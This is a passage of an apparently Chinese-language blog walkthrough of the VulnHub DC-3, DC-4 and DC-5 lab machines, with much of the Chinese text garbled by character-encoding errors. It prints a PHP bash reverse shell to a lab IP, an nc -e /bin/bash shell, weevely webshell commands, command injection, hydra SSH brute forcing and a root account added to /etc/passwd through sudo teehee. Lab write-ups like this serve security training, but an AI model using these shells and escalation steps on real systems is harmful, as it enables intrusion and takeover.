class="string">_</span>|<span class="string"> </span>|<span class="string">____/ \___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___(_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_)</span></span><br></pre></td></tr></table></figure><p><code>Congratulations are in order.  :-)</code></p><p><code>I hope you&#39;ve enjoyed this challenge as I enjoyed making it.</code></p><p><code>If there are any ways that I can improve these little challenges,</code><br><code>please let me know.</code></p><p><code>As per usual, comments and complaints can be sent via Twitter to @DCAU7</code></p><p><code>Have a great day!!!!</code></p><p>æ„æ€æ˜¯ï¼š</p><p>æ­å–œä½ ï¼Œä¸€åˆ‡æ­£å¸¸ã€‚ï¼š-ï¼‰</p><p>æˆ‘å¸Œæœ›ä½ å’Œæˆ‘ä¸€æ ·å–œæ¬¢è¿™ä¸ªæŒ‘æˆ˜ã€‚</p><p>å¦‚æœæœ‰ä»»ä½•æ–¹æ³•å¯ä»¥æ”¹å–„è¿™äº›å°æŒ‘æˆ˜ï¼Œ</p><p>è¯·è®©æˆ‘çŸ¥é“ã€‚</p><p>å¦‚å¾€å¸¸ä¸€æ ·ï¼Œè¯„è®ºå’ŒæŠ•è¯‰å¯ä»¥é€šè¿‡Twitterå‘é€åˆ°@DCAU7</p><p>ç¥ä½ æœ‰ç¾å¥½çš„ä¸€å¤©ï¼ï¼ï¼ï¼</p></blockquote><p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p><h3 id="æ³•2"><a href="#æ³•2" class="headerlink" title="æ³•2"></a>æ³•2</h3><h4 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a><strong>åå¼¹shell</strong></h4><blockquote><p>åå¼¹shellï¼Œå°±æ˜¯æ§åˆ¶ç«¯ç›‘å¬åœ¨æŸTCP&#x2F;UDPç«¯å£ï¼Œè¢«æ§ç«¯å‘èµ·è¯·æ±‚åˆ°è¯¥ç«¯å£ï¼Œå¹¶å°†å…¶å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ§åˆ¶ç«¯ã€‚</p><p>é€šä¿—ç‚¹è¯´ï¼Œåå¼¹shellå°±æ˜¯ä¸€ç§åå‘é“¾æ¥ï¼Œä¸æ­£å‘çš„sshç­‰ä¸åŒï¼Œå®ƒæ˜¯åœ¨å¯¹æ–¹ç”µè„‘æ‰§è¡Œå‘½ä»¤è¿æ¥åˆ°æˆ‘æ–¹çš„æ”»å‡»æ¨¡å¼ï¼Œå¹¶ä¸”è¿™ç§æ”»å‡»æ¨¡å¼å¿…é¡»æ­é…è¿œç¨‹æ‰§è¡Œå‘½ä»¤æ¼æ´æ¥ä½¿ç”¨ã€‚</p><p>ç”±äºé˜²ç«å¢™ç­‰é™åˆ¶ï¼Œå¯¹æ–¹æœºå™¨åªèƒ½å‘é€è¯·æ±‚ï¼Œä¸èƒ½æ¥æ”¶è¯·æ±‚</p><p>å¯¹äºç—…æ¯’ï¼Œæœ¨é©¬ï¼Œå—å®³è€…ä»€ä¹ˆæ—¶å€™èƒ½ä¸­æ‹›ï¼Œå¯¹æ–¹çš„ç½‘ç»œç¯å¢ƒæ˜¯ä»€ä¹ˆæ ·çš„ï¼Œä»€ä¹ˆæ—¶å€™å¼€å…³æœºï¼Œéƒ½æ˜¯æœªçŸ¥ï¼Œå»ºç«‹ä¸€ä¸ªæœåŠ¡ç«¯ï¼Œè®©æ¶æ„ç¨‹åºä¸»åŠ¨è¿æ¥ï¼Œæ‰æ˜¯ä¸Šç­–ã€‚</p></blockquote><p>å’Œæ³•ä¸€ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦å†™ä¸€ä¸ªåå¼¹<code>shell</code>çš„<code>php</code>æ–‡ä»¶</p><blockquote><p><code>&lt;?php system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.133.140/8888 0&gt;&amp;1&#39;&quot;);?&gt;</code></p><p>&#x2F;&#x2F;æ³¨æ„è¿™é‡Œçš„ipä¸ºkaliçš„ipï¼Œ8888ä¸ºç›‘å¬çš„ç«¯å£</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220904115013063.png" alt="image-20220904115013063"></p><blockquote><p>è¾“å…¥<code>nc -lnvp 8888</code>å¼€å§‹ç›‘å¬<br>ç„¶åè®¿é—®<code>456.php</code><br><code>http://192.168.133.139/templates/protostar/456.php</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220904130847588.png" alt="image-20220904130847588"></p><p>æ‹¿åˆ°<code>shell</code>ï¼Œåé¢ææƒå’Œæ³•ä¸€</p><p>ä¸€æ ·</p><h3 id="æ³•3"><a href="#æ³•3" class="headerlink" title="æ³•3"></a>æ³•3</h3><h4 id="weevelyã€ææƒæ²¡å›æ˜¾ã€‘"><a href="#weevelyã€ææƒæ²¡å›æ˜¾ã€‘" class="headerlink" title="weevelyã€ææƒæ²¡å›æ˜¾ã€‘"></a><strong>weevely</strong>ã€ææƒæ²¡å›æ˜¾ã€‘</h4><blockquote><p><code>Weevely</code>æ˜¯ä¸€æ¬¾ä½¿ç”¨pythonç¼–å†™çš„webshellå·¥å…·,é›†webshellç”Ÿæˆå’Œè¿æ¥äºä¸€èº«,é‡‡ç”¨c&#x2F;sæ¨¡å¼ æ„å»º,å¯ä»¥ç®—ä½œæ˜¯linuxä¸‹çš„ä¸€æ¬¾phpèœåˆ€æ›¿ä»£å·¥å…·</p></blockquote><p>ç”Ÿæˆ<code>Shell</code></p><blockquote><p><code>weevely generate  &lt;æ–‡ä»¶å&gt;</code></p><p><code>weevely generate 123456 shell.php</code></p></blockquote><p>æŠŠç”Ÿæˆçš„å†…å®¹ï¼Œå¤åˆ¶åˆ°æˆ‘ä»¬åˆ›å»ºçš„<code>789.php</code>æ–‡ä»¶é‡Œï¼Œå’Œå‰é¢ä¸¤ä¸ªæ–¹æ³•æ­¥éª¤ä¸€æ ·</p><p>åˆ©ç”¨è§¦å‘<code>shell</code></p><blockquote><p><code>weevely http://192.168.133.139/templates/protostar/789.php 123456</code></p><p><code>python -m http.server 9999</code>   </p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220904133118746.png" alt="image-20220904133118746"></p><p>æˆåŠŸè¿›å…¥<code>shell</code></p><p>ä½†æ˜¯å½“æ‰§è¡Œææƒæ—¶</p><p><img src="/2022/08/29/vulnhub/image-20220904135935922.png" alt="image-20220904135935922"></p><p>æŠ¥é”™æ— æ³•ææƒï¼Œçœ‹æ¥æ˜¯è¢«è¿‡æ»¤å•¥çš„</p><hr><h1 id="å››ã€DC-4-åˆçº§"><a href="#å››ã€DC-4-åˆçº§" class="headerlink" title="å››ã€DC-4[åˆçº§]"></a>å››ã€DC-4[åˆçº§]</h1><p><strong>only one flag</strong></p><h2 id="ä¿¡æ¯æ”¶é›†-3"><a href="#ä¿¡æ¯æ”¶é›†-3" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å…ˆçœ‹çœ‹é¶æœºç«¯å£è¿è¡Œçš„æœåŠ¡</p><p><img src="/2022/08/29/vulnhub/image-20220918190610478.png" alt="image-20220918190610478"></p><p>å‘ç°æœ‰<code>22</code>å’Œ<code>80</code>ç«¯å£ï¼Œåˆ†åˆ«è¿è¡Œ<code>ssh</code>å’Œ<code>http</code></p><p>æˆ‘ä»¬å…ˆè®¿é—®<code>80</code>ç«¯å£</p><blockquote><p>è®¿é—®ipï¼š<code>192.168.133.141</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220918190945726.png" alt="image-20220918190945726"></p><p>æ˜¯ä¸€ä¸ªåŸºæœ¬çš„ç™»å½•çª—å£ï¼Œæœ‰æç¤ºæ˜¯<code>admin</code>ç”¨æˆ·ç™»å½•ç•Œé¢ï¼Œæ‰€ä»¥<strong>å¯èƒ½éœ€è¦å¯†ç çˆ†ç ´ç™»å½•</strong></p><p>æˆ‘ä»¬å†åˆ©ç”¨<code>wappalyzer</code>çœ‹ä¸€ä¸‹ç½‘ç«™ä¸€äº›åŸºæœ¬ä¿¡æ¯</p><p><img src="/2022/08/29/vulnhub/image-20220918194402321.png" alt="image-20220918194402321"></p><p>æ²¡æœ‰å•¥æœ‰ç”¨çš„ä¿¡æ¯</p><h2 id="å¯†ç çˆ†ç ´"><a href="#å¯†ç çˆ†ç ´" class="headerlink" title="å¯†ç çˆ†ç ´"></a>å¯†ç çˆ†ç ´</h2><p>ç„¶åæˆ‘ä»¬å°±å¼€å§‹è¿›è¡Œå¯†ç çˆ†ç ´</p><p>å·²çŸ¥ç”¨æˆ·åä¸º<code>admin</code>ï¼Œåªç”¨å¯¹å¯†ç çˆ†ç ´</p><p><img src="/2022/08/29/vulnhub/image-20220918202233098.png" alt="image-20220918202233098"></p><p>ã€å­—å…¸å¯ä»¥è‡ªå·±æ‰¾ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥çœ‹æˆ‘å­¦ä¹ ç¬”è®°å†™çš„ç½‘ç«™ä¸‹è½½ã€‘</p><p>è¿™é‡Œæˆ‘ç”¨çš„<code>top2000.txt</code></p><p>æœ€åçˆ†ç ´å‡ºå¯†ç ä¸º<code>happy</code></p><p><img src="/2022/08/29/vulnhub/image-20220918203225520.png" alt="image-20220918203225520"></p><p>ç™»å½•è¯•è¯•</p><p><img src="/2022/08/29/vulnhub/image-20220918204147349.png" alt="image-20220918204147349"></p><p>ç™»å½•æˆåŠŸï¼Œè¿›å…¥<code>Command</code></p><p><img src="/2022/08/29/vulnhub/image-20220918204230810.png" alt="image-20220918204230810"></p><p>ç‚¹å‡»<code>run</code>ï¼Œå°±ä¼šæ˜¾ç¤ºä¸Šé¢çš„æ•°æ®ï¼Œçœ‹æ¥æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯å®ƒé»˜è®¤æ˜¯<code>ls -l</code>ï¼Œæˆ‘ä»¬è¯•è¯•æŠ“åŒ…èƒ½ä¿®æ”¹è¯·æ±‚åŒ…é‡Œçš„å‘½ä»¤å—</p><p><img src="/2022/08/29/vulnhub/image-20220918204413877.png" alt="image-20220918204413877"></p><p>å‘ç°æ˜¯å¯ä»¥ä¿®æ”¹çš„ï¼Œæˆ‘ä»¬è¯•è¯•<code>whoami</code>å‘½ä»¤ï¼Œçœ‹çœ‹å½“å‰ç½‘ç«™ç™»å½•ç”¨æˆ·æƒé™</p><blockquote><p>è¾“å…¥<code>whoami</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220918204514149.png" alt="image-20220918204514149"></p><p>å‘ç°æ˜¯æ™®é€šç”¨æˆ·æƒé™</p><p>ä¸‹é¢æ˜¯ä¸¤ä¸ª<code>getshell</code>çš„æ€è·¯</p><hr><p><strong>1.</strong></p><p>åç»­æŸ¥è¯¢æ“ä½œï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥åˆ©ç”¨<code>nc</code><strong>åå¼¹shell</strong>ï¼ŒåŒæ ·ä¹Ÿå¯ä»¥æ‰¾åˆ°ç”¨æˆ·ç›®å½•ä¿¡æ¯</p><blockquote><p>ç»ˆç«¯è¾“å…¥<code>nc -l -vv -p 8888</code>ï¼Œç›‘å¬8888ç«¯å£</p></blockquote><p>æŠ“åŒ…æ•°æ®å‘½ä»¤ä¿®æ”¹ä¸º</p><blockquote><p><code>nc -nv 192.168.133.140 8888 -e /bin/bash</code>   &#x2F;&#x2F;<code>192.168.133.140</code>æ˜¯è™šæ‹Ÿæœºipï¼Œä¸æ˜¯é¶æœºip</p></blockquote><p>ç„¶åç»ˆç«¯å°±å¯ä»¥æ‰§è¡Œåç»­æ‰§è¡Œå‘½ä»¤çš„ç±»ä¼¼æ“ä½œï¼Œå°±æ˜¯æ‰§è¡Œçš„æ—¶å€™å¯èƒ½ç¨å¾®æ–¹ä¾¿ä¸€äº›</p><hr><p><strong>2.</strong></p><p>æˆ‘ä»¬ä¿®æ”¹å‘½ä»¤ï¼ŒæŸ¥è¯¢<code>/etc/passwd</code>æ–‡æ¡£ï¼ˆè®°å½•æ¯ä¸ªç”¨æˆ·çš„ä¿¡æ¯ï¼Œæ–¹ä¾¿ç®¡ç†å‘˜å¯¹ç”¨æˆ·çš„ç®¡ç†çš„ä¸€ä¸ªæ–‡æ¡£ï¼‰</p><blockquote><p>è¾“å…¥<code>cat+/etc/passwd</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220918205535912.png" alt="image-20220918205535912"></p><p>å‘ç°æœ‰ä¸‰ä¸ªç”¨æˆ·</p><blockquote><p><code>charles</code><br><code>jim</code><br><code>sam</code></p></blockquote><p>æˆ‘ä»¬æŸ¥çœ‹è¿™å‡ ä¸ªç”¨æˆ·çš„ç›®å½•ä¸‹æœ‰æ²¡æœ‰æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯</p><p>å…ˆè®¿é—®<code>charles</code></p><blockquote><p>è¾“å…¥<code>ls+-a+/home/charles</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220918211049263.png" alt="image-20220918211049263"></p><p>æ„Ÿè§‰æ²¡å•¥æœ‰ç”¨çš„ä¿¡æ¯</p><p>å†çœ‹çœ‹<code>jim</code></p><blockquote><p>è¾“å…¥<code>ls+-a+/home/jim</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220918211159526.png" alt="image-20220918211159526"></p><p>å‘ç°å…³é”®ä¿¡æ¯ï¼Œ <code>backups</code>ç›®å½•å’Œ<code>mbox</code>ç›®å½•ï¼Œ<code>test.sh</code>é‡Œé¢æˆ‘çœ‹äº†ï¼Œæ²¡å•¥æœ‰ç”¨çš„ä¿¡æ¯</p><p>å…ˆçœ‹<code>backups</code>ç›®å½•</p><blockquote><p>è¾“å…¥<code>ls+-a+/home/jim/backups</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220918211855793.png" alt="image-20220918211855793"></p><p>å‘ç°æœ‰ä¸ª<code>old-passwords.bak</code>ï¼Œè¿™ä¸ªå¯èƒ½å°±æ˜¯ç™»å½•è¿™ä¸‰ä¸ªç”¨æˆ·çš„å…³é”®</p><p>æŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p><blockquote><p>è¾“å…¥<code>cat+/home/jim/old-passwords.bak</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220918212107439.png" alt="image-20220918212107439"></p><p>å‘ç°æ˜¯ä¸€ä¸ªå¯†ç è¡¨ï¼Œå¤åˆ¶åˆ°ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå½“ä½œçˆ†ç ´çš„å¯†ç è¡¨</p><h2 id="hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´"><a href="#hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´" class="headerlink" title="hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´"></a>hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´</h2><p>æˆ‘ä»¬å·²ç»æœ‰äº†å¯†ç è¡¨<code>ï¼ˆpd.txtï¼‰</code>,æˆ‘ä»¬å†æŠŠä¸‰ä¸ªç”¨æˆ·åå†™åˆ°å¦ä¸€ä¸ªæ–‡æ¡£é‡Œ<code>ï¼ˆun.txtï¼‰</code></p><p>å› ä¸ºä¹‹å‰æˆ‘ä»¬æ‰«æçŸ¥é“ï¼Œ<code>22</code>ç«¯å£è¿è¡Œç€<code>ssh</code>ï¼Œè€Œ<code>80</code>ç«¯å£æˆ‘ä»¬å·²ç»è®¿é—®äº†ï¼Œæ‰€ä»¥ä¸‹é¢ç«¯å£å†™<code>22</code></p><p>äºæ˜¯</p><blockquote><p>è¾“å…¥<code>hydra -L un.txt -P pd.txt 192.168.133.141 ssh -s 22</code></p></blockquote><p>æœ‰ç‚¹ä¹…ï¼Œç­‰ä¸€ä¼šå°±è¡Œ</p><p><img src="/2022/08/29/vulnhub/image-20220918214254623.png" alt="image-20220918214254623"></p><p>å¾—åˆ°<code>jim</code>ç”¨æˆ·çš„å¯†ç </p><blockquote><p><code>jibril04</code></p></blockquote><p>ç„¶åæˆ‘ä»¬ç™»å½•<code>ssh</code></p><blockquote><p>è¾“å…¥<code>ssh jim@192.168.133.141 -p 22</code></p></blockquote><p>ç„¶åè¾“å…¥å¯†ç åï¼Œç™»å½•æˆåŠŸ</p><p><img src="/2022/08/29/vulnhub/image-20220918214519470.png" alt="image-20220918214519470"></p><p>æˆ‘ä»¬å…ˆçœ‹çœ‹æˆ‘ä»¬èƒ½å¦æ‰§è¡Œä¸€äº›ç®¡ç†å‘˜å‘½ä»¤</p><blockquote><p>è¾“å…¥<code>sudo -l</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220918215754640.png" alt="image-20220918215754640"></p><p>å‘ç°<code>jim</code>ç”¨æˆ·ä¸èƒ½æ‰§è¡Œä»»ä½•ç®¡ç†å‘˜å‘½ä»¤ï¼Œæ‰€ä»¥ä¸å¯èƒ½åœ¨<code>jim</code>ç”¨æˆ·ä¸Šè¿›è¡Œææƒæˆ–å…¶ä»–åç»­æ“ä½œ</p><p>æˆ‘ä»¬ä»”ç»†ä¸€äº›å¯ä»¥çœ‹åˆ°</p><p><img src="/2022/08/29/vulnhub/image-20220918214603182.png" alt="image-20220918214603182"></p><p>è¯´æˆ‘ä»¬æœ‰ä¸€å°é‚®ä»¶ï¼Œé‚£æˆ‘ä»¬å°±çœ‹çœ‹è¿™å°ç”¨é‚®ä»¶æ˜¯ä»€ä¹ˆ</p><p>ä½†æˆ‘ä»¬ä¸çŸ¥é“<code>mail</code>åœ¨å“ªé‡Œ</p><blockquote><p>è¾“å…¥<code>find / -name mail</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220918215012745.png" alt="image-20220918215012745"></p><p>æ‰¾åˆ°ä½ç½®<code>/var/mail</code></p><blockquote><p>è¾“å…¥<code>cd /var/mail;ls -a</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220918215052934.png" alt="image-20220918215052934"></p><p>å‘ç°æœ‰ä¸€å°åä¸º<code>jim</code>çš„é‚®ä»¶ï¼ŒæŸ¥çœ‹ä¿¡æ¯</p><blockquote><p>è¾“å…¥<code>cat jim</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220918215204901.png" alt="image-20220918215204901"></p><p>å‘ç°æ˜¯<code>charles</code>å‘ç»™<code>jim</code>çš„é‚®ä»¶</p><blockquote><p><code>Hi Jim,</code></p><p><code>I&#39;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</code></p><p><code>Password is:  ^xHhA&amp;hvim0y</code></p><p><code>See ya,</code><br><code>Charles</code></p><p>ç¿»è¯‘ï¼š<br>å—¨ï¼Œå‰å§†ï¼Œ</p><p>æˆ‘ä»Šå¤©å¹´åº•è¦æ”¾å‡ï¼Œæ‰€ä»¥è€æ¿è®©æˆ‘æŠŠå¯†ç ç»™ä½ ï¼Œä»¥é˜²ä¸‡ä¸€ã€‚</p><p>å¯†ç æ˜¯ï¼š^xHhA&amp;hvim0y</p><p>å†è§ï¼Œ<br>æŸ¥å°”æ–¯</p></blockquote><p>ä¿¡é‡Œæåˆ°ä»–è‡ªå·±çš„å¯†ç </p><blockquote><p><code>^xHhA&amp;hvim0y</code></p></blockquote><p>äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥ç™»å½•<code>charles</code>çš„è´¦å·ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ‡æ¢ç”¨æˆ·</p><blockquote><p>è¾“å…¥<code>su charles</code></p></blockquote><p>ç„¶åè¾“å…¥å¯†ç åï¼Œç™»å½•æˆåŠŸ</p><p><img src="/2022/08/29/vulnhub/image-20220918215532470.png" alt="image-20220918215532470"></p><p>å…ˆçœ‹çœ‹<code>charles</code>èƒ½æ‰§è¡Œä»€ä¹ˆç®¡ç†å‘˜å‘½ä»¤</p><blockquote><p>è¾“å…¥<code>sudo -l</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220918220005178.png" alt="image-20220918220005178"></p><p>å‘ç°<code>charles</code>å¯ä»¥æ‰§è¡Œç®¡ç†å‘˜çš„<code>teehee</code>å‘½ä»¤</p><h2 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h2><p>æˆ‘ä»¬å…ˆéœ€è¦çŸ¥é“è¿™ä¸ªå‘½ä»¤æ˜¯å¹²ä»€ä¹ˆçš„</p><blockquote><p>è¾“å…¥<code>teehee -h</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220918220336958.png" alt="image-20220918220336958"></p><p><u><strong>å‘ç°å®ƒæ˜¯å¯ä»¥ä¿®æ”¹æ–‡ä»¶çš„æ•°æ®ï¼Œ-aæŒ‡ä»¤èƒ½å¤Ÿä¿è¯ä¿®æ”¹æ–‡ä»¶ä¸ä¼šè¦†ç›–åŸæœ‰æ–‡ä»¶</strong></u></p><p>é‚£æˆ‘ä»¬éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œå°±å¯ä»¥åœ¨<code>/etc/passwd</code>é‡Œé¢æ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·æ•°æ®</p><h3 id="æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·"><a href="#æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·" class="headerlink" title="æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·"></a>æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·</h3><blockquote><p>è¾“å…¥<code>sudo teehee -a /etc/passwd</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220918221258918.png" alt="image-20220918221258918"></p><p>ç„¶åå°±ç­‰å¾…æˆ‘ä»¬è¾“å…¥æ•°æ®</p><p><img src="/2022/08/29/vulnhub/image-20220918220824224.png" alt="image-20220918220824224"></p><p>æŒ‰ç…§<code>root</code>ç”¨æˆ·æ ¼å¼ï¼Œæˆ‘ä»¬æ·»åŠ è‡ªå·±çš„æ•°æ®</p><blockquote><p>è¾“å…¥<br><code>ttoc:</code>(è¿™é‡Œæ˜¯å¯†ç ï¼Œå¯ä»¥åŠ å…¥è‡ªå·±çš„å“ˆå¸Œåçš„å¯†ç ï¼Œå½“ç„¶ä¸åŠ å°±å¯ä»¥ç›´æ¥ç™»å½•ï¼Œè¿™é‡Œæˆ‘ä¸åŠ ï¼Œå¿½ç•¥)<code>:0:0:root:/root:/bin/bash</code></p></blockquote><p><img src="/2022/08/29/vulnhub/image-20220918221714606.png" alt="image-20220918221714606"></p><p>æ·»åŠ æˆåŠŸï¼Œæˆ‘ä»¬å†çœ‹çœ‹èƒ½ä¸èƒ½ç™»å½•ï¼Œæ˜¯ä¸æ˜¯ç®¡ç†å‘˜</p><p><img src="/2022/08/29/vulnhub/image-20220918221800576.png" alt="image-20220918221800576"></p><p>å‘ç°æ˜¯ç®¡ç†å‘˜ï¼Œç›´æ¥åˆ°<code>root</code>ç›®å½•ä¸‹ï¼ŒæŸ¥çœ‹ <code>flag</code>å³å¯</p><p><img src="/2022/08/29/vulnhub/image-20220918221943297.png" alt="image-20220918221943297"></p><blockquote><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br></pre></td></tr></table></figure><p><code>Congratulations!!!</code></p><p><code>Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and who have taken time to complete these little</code><br><code>challenges.</code></p><p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p><p>æ„æ€æ˜¯<br>æ­å–œï¼ï¼ï¼</p><p>å¸Œæœ›ä½ å–œæ¬¢ DC-4ã€‚åªæ˜¯æƒ³å‘æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢<br>è°æä¾›äº†åé¦ˆï¼Œè°èŠ±æ—¶é—´å®Œæˆäº†è¿™äº›å°äº‹<br>æŒ‘æˆ˜ã€‚</p><p>å¦‚æœä½ å–œæ¬¢è¿™ä¸ª CTFï¼Œè¯·é€šè¿‡@DCAU7 ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡ã€‚</p></blockquote><p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p><hr><h1 id="äº”ã€DC-5-é«˜çº§"><a href="#äº”ã€DC-5-é«˜çº§" class="headerlink" title="äº”ã€DC-5[é«˜çº§]"></a>äº”ã€DC-5[é«˜çº§]</h1><p><strong>only one flag</strong></p><h2 id="ä¿¡æ¯æ”¶é›†-4"><a href="#ä¿¡æ¯æ”¶é›†-4" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å®˜æ–¹æ–‡æ¡£é‡Œæœ‰ä¸€äº›æç¤ºè¯´æ˜ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹ä¸€ä¸‹</p><blockquote><p><code>As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide soKme kind of idea as to what the vulnerability might involve.</code></p><p><code>And just for the record, there is no phpmailer exploit involved. :-)</code><br>ç¿»è¯‘ï¼š<br>æ®æˆ‘æ‰€çŸ¥ï¼Œåªæœ‰ä¸€ä¸ªå¯åˆ©ç”¨çš„å…¥å£ç‚¹å¯ä»¥è¿›å…¥ï¼ˆä¹Ÿæ²¡æœ‰ SSHï¼‰ã€‚è¿™ä¸ªç‰¹å®šçš„å…¥å£ç‚¹å¯èƒ½å¾ˆéš¾è¯†åˆ«ï¼Œä½†å®ƒå°±åœ¨é‚£é‡Œã€‚æ‚¨éœ€è¦å¯»æ‰¾ä¸€äº›ä¸ä¼—ä¸åŒçš„ä¸œè¥¿ï¼ˆéšç€é¡µé¢çš„åˆ·æ–°è€Œæ”¹å˜çš„ä¸œè¥¿ï¼‰ã€‚è¿™æœ‰æœ›ä¸ºæ¼æ´å¯èƒ½æ¶‰åŠçš„å†…å®¹æä¾›æŸç§æƒ³æ³•ã€‚</p><p>åªæ˜¯ä¸ºäº†è®°å½•ï¼Œæ²¡æœ‰æ¶‰åŠ phpmailer æ¼æ´åˆ©ç”¨ã€‚:-)</p><p>&#x3D;&#x3D;&gt;å¤§è‡´å…³é”®çš„ä¿¡æ¯å°±æ˜¯ï¼Œåœ¨æˆ‘ä»¬åˆ·æ–°ç½‘é¡µçš„æ—¶å€™æœ‰çš„ä¸œè¥¿ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå¯¹åº”æŸç§æ¼æ´</p></blockquote><p>å…»æˆä¹ æƒ¯ï¼Œå…ˆé¡ºæ‰‹ç”¨<code>nmap</code>æ‰«ä¸€ä¸‹é¶æœºç«¯å£è¿è¡Œçš„æœåŠ¡ä¿¡æ¯</p><p><img src="/2022/08/29/vulnhub/image-20220923214221504.png" alt="image-20220923214221504"></p><p>å‘ç°<code>80</code>ç«¯å£æ­£å¸¸è¿è¡Œç€<code>http</code>ï¼Œ<code>54235</code>ç«¯å£æ‰“å¼€</p><hr><p>æˆ‘ä»¬è®¿é—®<code>192.168.133.143</code></p><p>å…ˆä¹ æƒ¯çœ‹çœ‹<code>Wappalyzer</code>åŸºæœ¬ä¿¡æ¯</p><p><img src="/2022/08/29/vulnhub/image-20220930190721316.png" alt="image-20220930190721316"></p><p>å‘ç°<code>Web server</code>æ˜¯<code>Nginx</code></p><p>å‘ç°æœ‰5ä¸ªçª—å£</p><p><img src="/2022/08/29/vulnhub/image-20220930190329914.png" 